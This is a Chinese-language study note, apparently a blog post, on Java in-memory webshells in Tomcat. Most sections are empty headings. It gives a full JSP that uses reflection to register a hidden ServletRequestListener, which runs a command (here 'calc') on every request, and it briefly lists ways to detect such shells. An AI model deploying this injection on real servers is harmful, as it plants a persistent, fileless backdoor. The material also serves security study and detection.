---
title: Java 内存马
categories:
- Network_Security
- Web
- Java_Security
- JNDI
tags:
- Java
- Serialization
---

# Java 内存马

1. 两年前粗略的学了一下，现在回过头来看，真的是啥也不会。

2. 重新看，再难啃的骨头也要吃下，这种涉及代码的还得自己跟着走一遍

3. 文章大体的内容基于 su18 师傅的文章：

    > https://su18.org/post/memory-shell/#filter-%E5%86%85%E5%AD%98%E9%A9%AC

## 1. 基于 Servlet API 相关的 JSP 动态注册内存马（版本 Tomcat 8.5.78）

### 1.1 Tomcat 架构



### 1.1 Filter 内存马

### 1.2 Servlet 内存马


### 1.3 Listener 内存马

1. Listener 更简单，它没什么要特别设置的，但是 Listener 触发需要一定的事件。因此要选择易触发的 Listener，这里就选 `ServletRequestListener`。每次访问系统都会创建 `HttpServletRequest` 对象，从而触发 `ServletRequestListener` 中的方法。

2. 代码如下：
    ```jsp
    <%@ page import="javax.servlet.annotation.WebListener" %>
    <%@ page import="java.io.IOException" %>
    <%@ page import="java.lang.reflect.Field" %>
    <%@ page import="org.apache.catalina.core.ApplicationContext" %>
    <%@ page import="org.apache.catalina.core.StandardContext" %><%--
      Created by IntelliJ IDEA.
      User: hasee
      Date: 2023/5/5
      Time: 19:40
      To change this template use File | Settings | File Templates.
    --%>
    <%@ page contentType="text/html;charset=UTF-8" language="java" %>
    <html>
    <head>
        <title>Title</title>
    </head>
    <body>
    <%!
        @WebListener("MemoryTrojanListener")
        public class MemoryTrojanListener implements ServletRequestListener {
    
            @Override
            public void requestDestroyed(ServletRequestEvent sre) {
    
            }
    
            @Override
            public void requestInitialized(ServletRequestEvent sre) {
                try {
                    Runtime.getRuntime().exec("calc");
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    %>
    <%
        // 1. 获取 StandardContext
        ServletContext servletContext = request.getServletContext();
        // ServletContext 中有 ApplicationContext，ApplicationContext 中又有 StandardContext。通过反射获取到 ApplicationContextField。
        Field applicationContextField = servletContext.getClass().getDeclaredField("context");
        applicationContextField.setAccessible(true);
        // 通过反射拿到 servletContext 具体的 ApplicationContext
        ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
        // 重复上述过程，从具体的 ApplicationContext 中拿到具体的 StandardContext
        Field standardContextField = applicationContext.getClass().getDeclaredField("context");
        standardContextField.setAccessible(true);
        StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
    
        // 2. 通过 standardContext 添加 listener
        standardContext.addApplicationEventListener(new MemoryTrojanListener());
    %>
    </body>
    </html>
    ```

## 2. Spring

## 3. Tomcat

## 4. Java Agent 内存马



## 5. 内存马的查杀

### 5.1 针对 Servlet Api 的 JSP 木马的查杀

1. 使用 java-memshell-scanner 工具获取到应用中所有的 filter 和 servlet 相关信息。找没有对应的 class 字节码文件的 servlet 和 filter。
2. 查阅 Tomcat 的访问日志，排查可疑的访问请求。
